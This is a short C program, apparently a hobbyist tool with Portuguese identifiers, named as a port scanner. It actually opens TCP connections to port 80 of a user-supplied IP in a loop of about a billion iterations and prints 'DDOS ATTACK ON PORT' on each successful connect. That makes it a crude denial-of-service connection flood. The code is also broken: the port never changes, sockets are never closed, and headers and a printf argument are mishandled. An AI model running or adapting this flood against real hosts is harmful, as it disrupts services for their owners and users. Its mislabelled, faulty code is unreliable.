#include <stdio.h>
#include <netdb.h>

main(int argc, char *argv[])
{
	int meusocket;
	int conecta;
	int port = 80;
	int inicio = 0;
	int final = 1111165535;
	char * destino;
	destino = argv[1];
	int brute;
	
	 if(argc<2)
        {
                printf("ERRO - Uso invalido\n \nInforme o IP do host \n\n Uso: ./portScanFULLC <IP>\n");
                return 0;
	}
	struct sockaddr_in alvo;
	for(brute=inicio;brute<final;brute++)
	{

	meusocket = socket(AF_INET, SOCK_STREAM, 0);
	alvo.sin_family = AF_INET;
	alvo.sin_port = htons(port);
	alvo.sin_addr.s_addr = inet_addr(destino);

	conecta = connect(meusocket, (struct sockaddr *)&alvo, sizeof alvo);

	if(conecta == 0)
	{
		printf("DDOS ATTACK ON PORT: %d \n", port, brute);
	}else{
	}

}
}
